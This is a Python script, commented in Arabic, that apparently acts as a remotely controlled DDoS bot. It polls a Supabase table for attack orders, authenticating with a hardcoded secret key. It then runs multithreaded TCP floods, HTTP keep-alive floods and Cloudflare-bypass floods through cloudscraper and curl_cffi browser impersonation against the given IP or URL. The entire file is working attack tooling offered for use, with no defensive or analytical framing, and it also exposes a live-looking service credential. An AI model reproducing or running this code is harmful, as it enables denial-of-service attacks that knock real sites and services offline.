import socket
import os
import random
from threading import Thread
import multiprocessing
import time
import sys

# التأكد من وجود المكتبات المطلوبة وتثبيتها تلقائياً
for lib in ["requests", "cloudscraper", "curl_cffi"]:
    try:
        __import__(lib)
    except ImportError:
        os.system(f"pip3 install {lib}")

import requests
import cloudscraper
from curl_cffi import requests as curl_requests

SUPABASE_URL = "https://thmtvthwdhnglwejbatg.supabase.co/rest/v1/requests"
SUPABASE_KEY = "sb_secret_2tH8QCobmJfVfv1zn-OoPw_2uwK2cKO"

HEADERS = {
    "apikey": SUPABASE_KEY,
    "Authorization": f"Bearer {SUPABASE_KEY}",
    "Content-Type": "application/json"
}

def MyUser_Agent():
    return [
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]

def curl_cffi_bypass(url, duration, threads=100):
    end_time = time.time() + duration
    def attack_thread():
        # محاكاة بصمة كروم 120 (Chrome Impersonation)
        while time.time() < end_time:
            try:
                with curl_requests.Session() as s:
                    s.get(url, impersonate="chrome120", timeout=10)
            except:
                pass
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def launch_bypass_https(url, duration, threads=500):
    end_time = time.time() + duration
    def attack_thread():
        scraper = cloudscraper.create_scraper()
        while time.time() < end_time:
            try:
                scraper.get(url, timeout=10)
            except:
                pass
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def tcp_attack(ip, port, duration, threads=500, packet_size=65500):
    end_time = time.time() + duration
    def attack_thread():
        while time.time() < end_time:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                try:
                    sock.connect((ip, port))
                    while time.time() < end_time:
                        sock.send(random._urandom(packet_size))
                except:
                    pass
    for _ in range(threads):
        Thread(target=attack_thread, daemon=True).start()
    time.sleep(duration)

def moonHttp(host_http, port, duration):
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as mysocket:
                mysocket.connect((host_http, port))
                while time.time() < end_time:
                    mysocket.send(f'GET / HTTP/1.1\r\nHost: {host_http}\r\nUser-Agent: {random.choice(MyUser_Agent())}\r\nConnection: keep-alive\r\n\r\n'.encode())
        except:
            pass

def execute_attack(method, ip, port, duration):
    method_upper = method.upper()
    print(f"[*] Started Task: {method_upper} on {ip}:{port} for {duration}s")
    
    if method_upper == "HTTP":
        for _ in range(500):
            Thread(target=moonHttp, args=(ip, port, duration), daemon=True).start()
        time.sleep(duration)
    
    elif method_upper == "TCP":
        tcp_attack(ip, port, duration)
    
    elif method_upper == "BYPASS-HTTPS":
        launch_bypass_https(ip, duration)

    elif method_upper == "CURL-BYPASS":
        # يستخدم IP كـ URL في حالة هجوم الويب
        target_url = ip if ip.startswith("http") else f"http://{ip}:{port}"
        curl_cffi_bypass(target_url, duration)
    
    print(f"[!] Task Finished: {method_upper} on {ip}:{port}")

def check_new_requests():
    print("System Running... Listening for new requests.")
    last_id = 0
    
    try:
        response = requests.get(f"{SUPABASE_URL}?select=id&order=id.desc&limit=1", headers=HEADERS)
        if response.status_code == 200 and response.json():
            last_id = response.json()[0]['id']
    except:
        pass

    while True:
        try:
            response = requests.get(f"{SUPABASE_URL}?select=id,method,ip,port,Time&order=id.desc&limit=1", headers=HEADERS)
            if response.status_code == 200:
                data = response.json()
                if data and data[0]['id'] > last_id:
                    req = data[0]
                    last_id = req['id']
                    
                    p = multiprocessing.Process(
                        target=execute_attack, 
                        args=(req['method'], req['ip'], int(req['port']), int(req.get('Time', 60)))
                    )
                    p.start()
                    print(f"[+] New Process Started ID: {last_id} | Method: {req['method']}")
        except Exception as e:
            print(f"Error: {e}")
        
        time.sleep(2)

if __name__ == "__main__":
    check_new_requests()
